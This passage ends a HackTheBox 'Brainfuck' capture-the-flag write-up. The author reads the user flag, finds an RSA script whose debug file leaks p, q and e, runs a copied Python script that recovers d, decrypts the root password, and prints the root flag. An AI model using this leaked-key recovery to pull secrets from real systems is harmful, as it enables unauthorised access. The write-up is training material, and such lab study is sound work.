+<span class="n">You</span> <span class="n">have</span> <span class="n">mail</span><span class="p">.</span>
+<span class="n">Last</span> <span class="nl">login</span><span class="p">:</span> <span class="n">Wed</span> <span class="n">May</span>  <span class="mi">3</span> <span class="mi">19</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mo">00</span> <span class="mi">2017</span> <span class="n">from</span> <span class="mf">10.10.11.4</span>
+</pre></div>
+
+
+<p>a simple <strong><em>ls</em></strong> gives us this output:</p>
+<div class="highlight"><pre><span></span><span class="err">orestis@brainfuck:~$ ls</span>
+<span class="err">debug.txt  encrypt.sage  mail  output.txt  user.txt</span>
+</pre></div>
+
+
+<p>and therefore we can read the user.txt</p>
+<div class="highlight"><pre><span></span><span class="err">orestis@brainfuck:~$ cat user.txt </span>
+<span class="err">2c****************************c9</span>
+</pre></div>
+
+
+<p>Inspecting the content of the home directory, I find <strong>encrypt.sage</strong> pretty interesting:</p>
+<div class="highlight"><pre><span></span><span class="n">orestis</span><span class="nv">@brainfuck</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">encrypt</span><span class="p">.</span><span class="n">sage</span><span class="w"> </span>
+<span class="n">nbits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1024</span><span class="w"></span>
+
+<span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">open</span><span class="p">(</span><span class="ss">&quot;/root/root.txt&quot;</span><span class="p">).</span><span class="k">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span><span class="w"></span>
+<span class="n">enc_pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">open</span><span class="p">(</span><span class="ss">&quot;output.txt&quot;</span><span class="p">,</span><span class="ss">&quot;w&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="n">debug</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">open</span><span class="p">(</span><span class="ss">&quot;debug.txt&quot;</span><span class="p">,</span><span class="ss">&quot;w&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Integer</span><span class="p">(</span><span class="nc">int</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span><span class="mi">16</span><span class="p">))</span><span class="w"></span>
+
+<span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random_prime</span><span class="p">(</span><span class="mi">2</span><span class="o">^</span><span class="nf">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">lbound</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="nf">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">proof</span><span class="o">=</span><span class="k">False</span><span class="p">)</span><span class="w"></span>
+<span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">random_prime</span><span class="p">(</span><span class="mi">2</span><span class="o">^</span><span class="nf">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">lbound</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="nf">floor</span><span class="p">(</span><span class="n">nbits</span><span class="o">/</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="n">proof</span><span class="o">=</span><span class="k">False</span><span class="p">)</span><span class="w"></span>
+<span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">*</span><span class="n">q</span><span class="w"></span>
+<span class="n">phi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"></span>
+<span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ZZ</span><span class="p">.</span><span class="n">random_element</span><span class="p">(</span><span class="n">phi</span><span class="p">)</span><span class="w"></span>
+<span class="k">while</span><span class="w"> </span><span class="n">gcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="n">phi</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">1</span><span class="err">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ZZ</span><span class="p">.</span><span class="n">random_element</span><span class="p">(</span><span class="n">phi</span><span class="p">)</span><span class="w"></span>
+
+
+
+<span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"></span>
+<span class="n">enc_pass</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="s1">&#39;Encrypted Password: &#39;</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\n&#39;</span><span class="p">)</span><span class="w"></span>
+<span class="n">debug</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\n&#39;</span><span class="p">)</span><span class="w"></span>
+<span class="n">debug</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">q</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\n&#39;</span><span class="p">)</span><span class="w"></span>
+<span class="n">debug</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;\n&#39;</span><span class="p">)</span><span class="w"></span>
+</pre></div>
+
+
+<p>Again, if you are familiar with cryptography, this may resamble to <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA encryption</a>. Particularly interesting is that the debug entries at the end of the file indicate that <strong>p</strong>, <strong>q</strong>, and <strong>e</strong> are written in debug.txt. </p>
+<div class="highlight"><pre><span></span><span class="err">orestis@brainfuck:~$ cat debug.txt </span>
+<span class="err">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
+<span class="err">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
+<span class="err">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
+</pre></div>
+
+
+<p>So looking ad debug.txt we should have <strong>p</strong>, <strong>q</strong>, and <strong>e</strong> respectively on each separate line. I then started to look on google for a way to retrieve <strong>d</strong> (the decryption key) from <strong>p</strong>, <strong>q</strong>, and <strong>e</strong>.</p>
+<p>I found a script on a <a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">stackexchange post</a> which may do the trick:</p>
+<div class="highlight"><pre><span></span><span class="nt">def</span> <span class="nt">egcd</span><span class="o">(</span><span class="nt">a</span><span class="o">,</span> <span class="nt">b</span><span class="o">):</span>
+    <span class="nt">x</span><span class="o">,</span><span class="nt">y</span><span class="o">,</span> <span class="nt">u</span><span class="o">,</span><span class="nt">v</span> <span class="o">=</span> <span class="nt">0</span><span class="o">,</span><span class="nt">1</span><span class="o">,</span> <span class="nt">1</span><span class="o">,</span><span class="nt">0</span>
+    <span class="nt">while</span> <span class="nt">a</span> <span class="o">!=</span> <span class="nt">0</span><span class="o">:</span>
+        <span class="nt">q</span><span class="o">,</span> <span class="nt">r</span> <span class="o">=</span> <span class="nt">b</span><span class="o">//</span><span class="nt">a</span><span class="o">,</span> <span class="nt">b</span><span class="o">%</span><span class="nt">a</span>
+        <span class="nt">m</span><span class="o">,</span> <span class="nt">n</span> <span class="o">=</span> <span class="nt">x-u</span><span class="o">*</span><span class="nt">q</span><span class="o">,</span> <span class="nt">y-v</span><span class="o">*</span><span class="nt">q</span>
+        <span class="nt">b</span><span class="o">,</span><span class="nt">a</span><span class="o">,</span> <span class="nt">x</span><span class="o">,</span><span class="nt">y</span><span class="o">,</span> <span class="nt">u</span><span class="o">,</span><span class="nt">v</span> <span class="o">=</span> <span class="nt">a</span><span class="o">,</span><span class="nt">r</span><span class="o">,</span> <span class="nt">u</span><span class="o">,</span><span class="nt">v</span><span class="o">,</span> <span class="nt">m</span><span class="o">,</span><span class="nt">n</span>
+        <span class="nt">gcd</span> <span class="o">=</span> <span class="nt">b</span>
+    <span class="nt">return</span> <span class="nt">gcd</span><span class="o">,</span> <span class="nt">x</span><span class="o">,</span> <span class="nt">y</span>
+
+<span class="nt">def</span> <span class="nt">main</span><span class="o">():</span>
+
+    <span class="nt">p</span> <span class="o">=</span> <span class="nt">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
+    <span class="nt">q</span> <span class="o">=</span> <span class="nt">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
+    <span class="nt">e</span> <span class="o">=</span> <span class="nt">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
+    <span class="nt">ct</span> <span class="o">=</span> <span class="nt">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span>
+
+    <span class="err">#</span> <span class="nt">compute</span> <span class="nt">n</span>
+    <span class="nt">n</span> <span class="o">=</span> <span class="nt">p</span> <span class="o">*</span> <span class="nt">q</span>
+
+    <span class="err">#</span> <span class="nt">Compute</span> <span class="nt">phi</span><span class="o">(</span><span class="nt">n</span><span class="o">)</span>
+    <span class="nt">phi</span> <span class="o">=</span> <span class="o">(</span><span class="nt">p</span> <span class="nt">-</span> <span class="nt">1</span><span class="o">)</span> <span class="o">*</span> <span class="o">(</span><span class="nt">q</span> <span class="nt">-</span> <span class="nt">1</span><span class="o">)</span>
+
+    <span class="err">#</span> <span class="nt">Compute</span> <span class="nt">modular</span> <span class="nt">inverse</span> <span class="nt">of</span> <span class="nt">e</span>
+    <span class="nt">gcd</span><span class="o">,</span> <span class="nt">a</span><span class="o">,</span> <span class="nt">b</span> <span class="o">=</span> <span class="nt">egcd</span><span class="o">(</span><span class="nt">e</span><span class="o">,</span> <span class="nt">phi</span><span class="o">)</span>
+    <span class="nt">d</span> <span class="o">=</span> <span class="nt">a</span>
+
+    <span class="nt">print</span><span class="o">(</span> <span class="s2">&quot;n:  &quot;</span> <span class="o">+</span> <span class="nt">str</span><span class="o">(</span><span class="nt">d</span><span class="o">)</span> <span class="o">);</span>
+
+    <span class="err">#</span> <span class="nt">Decrypt</span> <span class="nt">ciphertext</span>
+    <span class="nt">pt</span> <span class="o">=</span> <span class="nt">pow</span><span class="o">(</span><span class="nt">ct</span><span class="o">,</span> <span class="nt">d</span><span class="o">,</span> <span class="nt">n</span><span class="o">)</span>
+    <span class="nt">print</span><span class="o">(</span> <span class="s2">&quot;pt: &quot;</span> <span class="o">+</span> <span class="nt">str</span><span class="o">(</span><span class="nt">pt</span><span class="o">)</span> <span class="o">)</span>
+
+<span class="nt">if</span> <span class="nt">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="o">:</span>
+    <span class="nt">main</span><span class="o">()</span>
+</pre></div>
+
+
+<p>I replaced <strong>p</strong>, <strong>q</strong>, and <strong>e</strong> with the values found on debug.txt and the cypher-text <strong>ct</strong> with the value found in output.txt.</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:~# python decrypt_rsa.py</span>
+<span class="c">n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977</span>
+<span class="c">pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750</span>
+</pre></div>
+
+
+<p>so we got <strong>pt</strong>, the plain-text, which we now need to convert into readable ascii. Since it was originally converted from string to hex and then to int, we now first convert it to hex and then back to string as follow:</p>
+<div class="highlight"><pre><span></span><span class="s s-Atom">root@</span><span class="nv">Kali</span><span class="s s-Atom">:~#</span> <span class="s s-Atom">python</span>
+<span class="nv">Python</span> <span class="mf">2.7.17</span> <span class="p">(</span><span class="s s-Atom">default</span><span class="p">,</span> <span class="nv">Oct</span> <span class="mi">19</span> <span class="mi">2019</span><span class="p">,</span> <span class="mi">23</span><span class="s s-Atom">:</span><span class="mi">36</span><span class="s s-Atom">:</span><span class="mi">22</span><span class="p">)</span> 
+<span class="p">[</span><span class="nv">GCC</span> <span class="mf">9.2.1</span> <span class="mi">20191008</span><span class="p">]</span> <span class="s s-Atom">on</span> <span class="s s-Atom">linux2</span>
+<span class="nv">Type</span> <span class="s2">&quot;help&quot;</span><span class="p">,</span> <span class="s2">&quot;copyright&quot;</span><span class="p">,</span> <span class="s2">&quot;credits&quot;</span> <span class="s s-Atom">or</span> <span class="s2">&quot;license&quot;</span> <span class="s s-Atom">for</span> <span class="s s-Atom">more</span> <span class="s s-Atom">information</span><span class="p">.</span>
+<span class="s s-Atom">&gt;&gt;&gt;</span> <span class="s s-Atom">pt</span><span class="o">=</span><span class="mi">24604052029401386049980296953784287079059245867880966944246662849341507003750</span>
+<span class="s s-Atom">&gt;&gt;&gt;</span> <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="s s-Atom">pt</span><span class="p">)[</span><span class="mi">2</span><span class="p">:-</span><span class="mi">1</span><span class="p">]).</span><span class="nf">decode</span><span class="p">(</span><span class="s s-Atom">&#39;hex&#39;</span><span class="p">))</span>
+<span class="mi">6</span><span class="s s-Atom">efc1a5dbb8904751ce6566a305bb8ef</span>
+</pre></div>
+
+
+<p>The string we obtain is the root.txt.</p>
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+
+
+
+</body>
+</html>
